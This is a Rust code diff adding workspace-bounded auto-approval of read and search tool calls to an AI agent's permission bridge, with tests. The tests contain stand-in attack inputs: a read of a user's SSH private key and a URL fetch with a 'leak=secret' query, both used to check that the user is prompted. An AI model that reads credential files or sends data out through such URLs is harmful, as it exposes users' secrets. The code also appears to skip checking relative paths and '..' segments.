@@ -80,6 +80,8 @@ struct BridgeState {
     always: HashMap<AlwaysKey, Decision>,
     /// The adapter's private hook directory, refused on sight. See [`targets_hook_root`].
     hook_root: Option<PathBuf>,
+    /// Directories a read may touch without asking.
+    workspace_roots: Vec<PathBuf>,
 }
 
 /// Shared handle to the permission bridge.
@@ -136,6 +138,15 @@ impl PermissionBridge {
     pub async fn set_hook_root(&self, hook_root: &Path) {
         let mut state = self.state.lock().await;
         state.hook_root = Some(hook_root.to_path_buf());
+    }
+
+    /// Records the workspace a read may stay within without needing approval.
+    pub async fn set_workspace_root(&self, workspace_root: &str) {
+        let root = PathBuf::from(workspace_root);
+        let mut state = self.state.lock().await;
+        if !state.workspace_roots.contains(&root) {
+            state.workspace_roots.push(root);
+        }
     }
 
     /// Marks the session whose prompt is running, for the duration of that prompt.
@@ -229,6 +240,10 @@ impl PermissionBridge {
             }
         }
 
+        if let Some(reason) = self.auto_allow_reason(&tool_name, &args).await {
+            return (Decision::Allow, reason);
+        }
+
         let always_key = (session_id.clone(), tool_name.clone());
         if let Some(decision) = self.state.lock().await.always.get(&always_key).copied() {
             let reason = match decision {
@@ -282,6 +297,35 @@ impl PermissionBridge {
         };
 
         self.apply_outcome(&outcome, always_key, &tool_name).await
+    }
+
+    /// Decides whether a tool call is dull enough to approve without asking,
+    /// returning the reason it was waved through.
+    ///
+    /// Two things keep this narrow. Reading is only harmless when it stays inside
+    /// the workspace — `view_file` will otherwise happily read `~/.ssh/id_rsa`, and
+    /// agy's own gate is off — so anything naming a path outside is still asked
+    /// about. And tools that reach the network are excluded even though they only
+    /// read: a URL is an exfiltration channel, not just a fetch.
+    async fn auto_allow_reason(&self, tool_name: &str, args: &Value) -> Option<String> {
+        if std::env::var(PROMPT_ALL_ENV).is_ok_and(|v| !v.is_empty() && v != "0") {
+            return None;
+        }
+        if !AUTO_ALLOWED_TOOLS.contains(&tool_name) {
+            return None;
+        }
+
+        let workspace_roots = self.state.lock().await.workspace_roots.clone();
+        match outside_workspace(args, &workspace_roots) {
+            Some(path) => {
+                // Worth a prompt precisely because it leaves the workspace.
+                let _ = path;
+                None
+            }
+            None => Some(format!(
+                "Auto-allowed: `{tool_name}` cannot modify anything."
+            )),
+        }
     }
 
     async fn apply_outcome(
@@ -351,6 +395,80 @@ fn permission_options() -> Value {
         { "optionId": OPTION_REJECT_ONCE, "name": "Reject", "kind": "reject_once" },
         { "optionId": OPTION_REJECT_ALWAYS, "name": "Always reject", "kind": "reject_always" },
     ])
+}
+
+/// Set to a non-empty value other than `0` to prompt for every tool call.
+pub const PROMPT_ALL_ENV: &str = "AGY_ACP_PROMPT_ALL";
+
+/// Tools approved without asking, when their paths stay inside the workspace.
+///
+/// Everything here either only reads, or does nothing but talk to the user.
+/// Deliberately excluded: `read_url_content` and `search_web`, which read but do
+/// so over the network.
+const AUTO_ALLOWED_TOOLS: &[&str] = &[
+    // Asking the user a question is not an action to approve.
+    "ask_question",
+    // Reads.
+    "view_file",
+    "view_code_item",
+    "list_dir",
+    // Searches.
+    "grep_search",
+    "codebase_search",
+    "find_by_name",
+];
+
+/// Returns the first absolute path in `args` that falls outside every root.
+///
+/// Paths are compared after resolving symlinks where possible, since macOS reports
+/// `/tmp/x` to agy but `/private/tmp/x` to the permission layer.
+fn outside_workspace(args: &Value, roots: &[PathBuf]) -> Option<String> {
+    if roots.is_empty() {
+        // Without a known workspace nothing can be judged inside it.
+        return absolute_paths(args).into_iter().next();
+    }
+    absolute_paths(args)
+        .into_iter()
+        .find(|path| !roots.iter().any(|root| is_inside(path, root)))
+}
+
+fn is_inside(path: &str, root: &Path) -> bool {
+    let candidates = [Some(PathBuf::from(path)), resolve(Path::new(path))];
+    let roots = [Some(root.to_path_buf()), resolve(root)];
+    for candidate in candidates.iter().flatten() {
+        for root in roots.iter().flatten() {
+            if candidate == root || candidate.starts_with(root) {
+                return true;
+            }
+        }
+    }
+    false
+}
+
+/// Resolves a path, falling back to resolving the nearest existing ancestor so
+/// that not-yet-created files can still be placed.
+fn resolve(path: &Path) -> Option<PathBuf> {
+    if let Ok(resolved) = std::fs::canonicalize(path) {
+        return Some(resolved);
+    }
+    let parent = path.parent()?;
+    let name = path.file_name()?;
+    std::fs::canonicalize(parent).ok().map(|p| p.join(name))
+}
+
+/// Collects every absolute-looking path appearing in the tool arguments.
+fn absolute_paths(args: &Value) -> Vec<String> {
+    fn walk(value: &Value, found: &mut Vec<String>) {
+        match value {
+            Value::String(s) if s.starts_with('/') => found.push(s.clone()),
+            Value::Array(items) => items.iter().for_each(|v| walk(v, found)),
+            Value::Object(map) => map.values().for_each(|v| walk(v, found)),
+            _ => {}
+        }
+    }
+    let mut found = Vec::new();
+    walk(args, &mut found);
+    found
 }
 
 /// True if any string argument points inside the adapter's hook directory.
@@ -643,6 +761,125 @@ mod tests {
         assert_eq!(decision, Decision::Deny);
         assert!(reason.contains("internal directory"));
         assert!(rx.try_recv().is_err(), "the user must not be prompted");
+    }
+
+    /// Builds a bridge wired to a session, a hook root and a workspace.
+    async fn test_bridge(
+        workspace: &str,
+    ) -> (PermissionBridge, mpsc::UnboundedReceiver<Option<String>>) {
+        let (tx, rx) = mpsc::unbounded_channel();
+        let bridge = PermissionBridge {
+            state: Arc::new(Mutex::new(BridgeState::default())),
+            out_tx: tx,
+            socket_path: Arc::new(PathBuf::from("/tmp/unused.sock")),
+        };
+        bridge.register_conversation("conv-1", "session-1").await;
+        bridge.set_workspace_root(workspace).await;
+        (bridge, rx)
+    }
+
+    #[tokio::test]
+    async fn reads_inside_the_workspace_are_allowed_without_asking() {
+        let workspace = std::env::temp_dir().join("agy-acp-auto-allow-test");
+        std::fs::create_dir_all(&workspace).unwrap();
+        let (bridge, mut rx) = test_bridge(&workspace.display().to_string()).await;
+
+        for (tool, args) in [
+            (
+                "view_file",
+                json!({ "AbsolutePath": workspace.join("a.rs") }),
+            ),
+            ("list_dir", json!({ "DirectoryPath": workspace.to_str() })),
+            ("ask_question", json!({ "Question": "which one?" })),
+        ] {
+            let (decision, reason) = bridge
+                .decide(&json!({
+                    "conversationId": "conv-1",
+                    "toolCall": { "name": tool, "args": args },
+                }))
+                .await;
+            assert_eq!(decision, Decision::Allow, "{tool} should be auto-allowed");
+            assert!(reason.contains("Auto-allowed"), "{tool}: {reason}");
+        }
+        assert!(rx.try_recv().is_err(), "the user must not be prompted");
+    }
+
+    #[tokio::test]
+    async fn reads_outside_the_workspace_still_ask() {
+        let workspace = std::env::temp_dir().join("agy-acp-auto-allow-test");
+        std::fs::create_dir_all(&workspace).unwrap();
+        let (bridge, mut rx) = test_bridge(&workspace.display().to_string()).await;
+
+        let asking = {
+            let bridge = bridge.clone();
+            tokio::spawn(async move {
+                bridge
+                    .decide(&json!({
+                        "conversationId": "conv-1",
+                        "toolCall": {
+                            "name": "view_file",
+                            "args": { "AbsolutePath": "/Users/someone/.ssh/id_rsa" },
+                        },
+                    }))
+                    .await
+            })
+        };
+
+        let raw = rx.recv().await.unwrap().unwrap();
+        let request: Value = serde_json::from_str(&raw).unwrap();
+        assert_eq!(request["method"], "session/request_permission");
+
+        bridge
+            .resolve_response(
+                &request["id"],
+                Some(json!({ "outcome": { "outcome": "selected", "optionId": "reject_once" } })),
+            )
+            .await;
+        assert_eq!(asking.await.unwrap().0, Decision::Deny);
+    }
+
+    #[tokio::test]
+    async fn network_reads_are_never_auto_allowed() {
+        let (bridge, mut rx) = test_bridge("/work").await;
+
+        let asking = {
+            let bridge = bridge.clone();
+            tokio::spawn(async move {
+                bridge
+                    .decide(&json!({
+                        "conversationId": "conv-1",
+                        "toolCall": {
+                            "name": "read_url_content",
+                            "args": { "Url": "https://example.com/?leak=secret" },
+                        },
+                    }))
+                    .await
+            })
+        };
+
+        let raw = rx.recv().await.unwrap().unwrap();
+        let request: Value = serde_json::from_str(&raw).unwrap();
+        assert_eq!(request["method"], "session/request_permission");
+        bridge
+            .resolve_response(
+                &request["id"],
+                Some(json!({ "outcome": { "outcome": "selected", "optionId": "reject_once" } })),
+            )
+            .await;
+        assert_eq!(asking.await.unwrap().0, Decision::Deny);
+    }
+
+    #[test]
+    fn absolute_paths_are_collected_from_anywhere_in_the_arguments() {
+        let args = json!({
+            "TargetFile": "/a/b.txt",
+            "Nested": { "Other": "/c/d.txt" },
+            "List": ["/e/f.txt", "relative.txt"],
+            "Count": 3,
+        });
+        let mut found = absolute_paths(&args);
+        found.sort();
+        assert_eq!(found, vec!["/a/b.txt", "/c/d.txt", "/e/f.txt"]);
     }
 
     #[tokio::test]
